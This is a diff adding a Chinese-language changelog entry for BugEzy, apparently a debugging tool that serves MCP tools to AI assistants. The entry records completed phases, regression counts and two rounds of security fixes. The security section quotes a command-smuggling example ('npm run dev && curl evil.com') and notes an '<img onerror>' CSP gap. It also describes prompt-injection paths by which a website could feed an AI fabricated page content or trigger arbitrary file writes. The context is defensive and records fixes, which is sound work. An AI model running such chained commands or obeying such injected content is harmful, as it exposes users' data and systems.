@@ -1,5 +1,60 @@
 # BugEzy Changelog
 
+## Day 44（2026-08-17）— PM-334~381，46 張卡
+
+> 全站 MCP 工具 **65 支**（bridge 51 + 雲端 14）；全套回歸 **622~628 項 0 failed**。
+> 規格書 §9 的 **Phase 1／2／3／5／6 與 §14 全部標為完工**；剩下的主要階段只有 **Phase 4（Durable Objects 雲端通道）**。
+
+### Phase 2 圖釘完工（PM-334~336）
+`patrol_pins` 巡察、`remove_pin`、`clear_pins`。🔴 測試抓到真 bug：`pin_analyze` 在元素消失時只回裸錯誤、**沒把圖釘標成 `stale`**，巡檢看到的還是舊的 `active` —— 等於「元素不見了但沒人發現」。
+
+### Phase 3 視覺化 + Zone Grid 完工（PM-337~349）
+藍框動畫、圖釘狀態顏色、shadow DOM 即時面板；Zone Grid 8 支工具。
+🔴 **PM-342：§15.3 原本的「stack trace 反推 DOM」做不出來**（stack 只有檔名:行:列，瀏覽器沒有 frame→節點的 API），改為**在錯誤發生當下抓現場元素**。
+🔴 **PM-348：`get_zone_health` 原本以 `zoneList.length === 0` 當閘門**，導致沒有語意標籤的頁面（0 個 zone）整包被拒、錯誤完全看不見。
+
+### Phase 5 嚴重度 + 自動化完工（PM-350~354）
+`get_error_summary`、`add/list/remove_severity_rule`、`start_auto_detect`／`get_detect_report`、`correlate_errors`。分類器放 **bridge** 而非 content script —— 瀏覽器／終端機／zone 三條路徑要共用同一套判定，而終端機錯誤根本不經過瀏覽器。
+🔴 端到端抓到自己造成的矛盾：`get_page_health` 分數改用權重重算了，但 `summary` 仍引用舊分數，**而 AI 通常只讀 summary**。
+
+### §14 八層記憶矩陣完工（PM-355~361）
+13 支記憶工具 ＋ 額外的 `memory_stats`；`.bugezy/` 目錄、自動切換、淘汰、匯出匯入。
+🔴 **淘汰看 `last_hit_at` 不看 `created_at`** —— 直覺寫成「砍最舊的」剛好把答案反過來，而且平常完全看不出來。
+🔴 **三支守衛的 `passed: true` 不能等於「我檢查不了」**：自然語言規則機器評不了，改成「可機檢的逐條查、其餘原文交還給 AI，summary 明講還有 N 條要人工判讀」。
+
+### Phase 6 方案分層完工（PM-362~364）
+`TOOL_TIER_MAP` 涵蓋全部 51 支（**雙向比對**，新增工具漏列會直接測試失敗）；`start_auto_detect` 依參數分層（quick=Pro、full=Max）；雲端新增 `get_usage_quota`。
+⚠ 兩處卡片與線上實際不符**未改並已回報**：免費版重置是 30 天滾動制不是曆月 1 號；MCP 讀取**有**計入用量。
+
+### 兩輪安全審察與修復（PM-365~381）
+**第一輪（PM-365~367）**：🔴 P0 —— `ws://127.0.0.1` 被瀏覽器視為 potentially trustworthy、**不受 mixed-content 阻擋**，任何網站都能連上 bridge 並冒充 Extension 餵給 AI 捏造的頁面內容。加 Origin 驗證。P1 —— `memory_export` 可寫任意路徑（提示注入即可觸發）。並補上瀏覽器錯誤的 PII 遮罩，**保留型別標籤**（`<masked:JWT>` 而非一坨 `***`）讓工具不失去用處。
+
+**第二輪（PM-368~381）**：終端機指令白名單 + shell 元字元拒絕（**元字元要先檢查**，否則 `npm run dev && curl evil.com` 的第一個 token 是合法的 npm 會直接放行）；🔴 移除語音逐字稿經 MAIN world 中轉的整條路徑（原本會把**跨頁累積的整份語音緩存**送進與頁面共用的 JS 環境）；路徑改 realpath 正規化（`path.relative` 只比字串，專案內的 junction 能繞出去）；Origin 收緊為 BugEzy 專屬 ID；遮罩呼叫端限長；閘門預設開啟並綁 token；regex 複雜度守衛；綠界表單改 DOM 建構（`<img onerror>` **不受 CSP `script-src` 限制**）。
+
+**PM-380 授權稽核（唯讀）**：82 處資料表存取全數檢視，**沒有發現「用 client 傳入的 email/user_id 未經 token 校驗」的端點**。標紅兩項待決策 —— `mcp_usage` 沒有使用者維度（`get_usage_stats` 回的是全站數字，既是資訊外洩也是功能錯誤）、單筆報告的 MCP 工具只認 `report_id` 不驗擁有者。
+
+### 數據
+
+| 項目 | 數字 |
+|---|---|
+| bridge MCP 工具 | **51** |
+| 雲端 MCP 工具 | **14** |
+| 合計 | **65** |
+| 回歸測試 | **622~628 項，0 failed**（九套；差額來自環境相依的 LIMIT 分支，見下） |
+| 規格書 | **v1.7** |
+
+**關於「622~628」**：`_verify_phase1` 有兩處會依環境走 LIMIT 分支而不計分 —— `take_screenshot` 需要使用者手勢授予的 `activeTab`，`get_web_vitals` 在 Chrome 視窗失焦時拿不到 paint entry。**兩者都是環境限制而非產品缺陷**（工具誠實回 null 而不是編數字），所以標 LIMIT、既不計 pass 也不計 fail，但一定印出來。
+
+### FOX 待辦（跨 Day 累積）
+
+1. **重連 MCP 後要設 `BUGEZY_SESSION_TOKEN` 與 `BUGEZY_USER_EMAIL`**，否則閘門只放行 `ping`／`get_page_url`（PM-374）。臨時可用 `ENFORCE_TIER_GATE=false`。
+2. `npm start` 目前不在終端機監控白名單內（只含 `npm run *`）——要加說一聲。
+3. PM-378 的綠界流程**沒有真的刷卡驗證**，請實機走一次（測試環境即可）。
+4. PM-380 標紅兩項需要決策。
+5. `MONITOR_UPLOADED` 仍把報告 share URL 送進 MAIN world（與 PM-369 同類，未動）。
+6. 更早的累積待辦：`wrangler secret put DISCORD_WEBHOOK_URL`（Day 36 起未設）、`server/ticket-expiry-notify.sql`、報告清理 cron 由 dry-run 轉正、`ADMIN_TOKEN`、HSTS、GSC 驗證修正。
+
+
 ## 2026-08-17（Fable5 安全修復：P1×2、P2×5、P3×3）
 
 **PM-368~381**：全套 **628 / 0**（新增 `_verify375` 47 項；`_verify327` 21→37、`_verify362` 依新模型重寫）。
